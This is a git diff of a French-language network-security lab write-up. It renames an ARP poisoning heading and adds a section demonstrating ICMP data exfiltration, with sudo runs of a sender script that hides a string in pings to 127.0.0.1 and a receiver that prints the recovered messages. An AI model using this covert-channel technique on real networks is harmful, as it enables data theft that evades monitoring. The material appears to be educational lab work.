@@ -62,7 +62,7 @@ PC4> ping 8.8.8.8
 84 bytes from 8.8.8.8 icmp_seq=5 ttl=114 time=44.632 ms
 
 ```
-### Attaque arp
+### ARP (attaque 1)
 
 #### Poisoning
 
@@ -130,3 +130,19 @@ Chiffrez les communications réseau pour empêcher le vol d'informations sensibl
 
 - Implémentez HTTPS pour les sites web et HSTS pour forcer son utilisation.
 - Assurez-vous que les connexions à distance utilisent SSH, VPN ou TLS.
+
+### ICMP (attaque 2)
+
+```
+sudo python icmp_basic_exfiltr.py 127.0.0.1 'hello data'
+[sudo] password for kali: 
+[*] Envoi de la chaîne 'hello data' dans des pings vers 127.0.0.1
+[*] Paquet envoyé : hello data
+```
+```
+sudo python icmp_basic_receiver.py
+[*] En attente de messages ICMP contenant des données...
+Message reçu : Hello, ICMP exfiltration
+Message reçu : Hello, ICMP exfiltration
+```
+
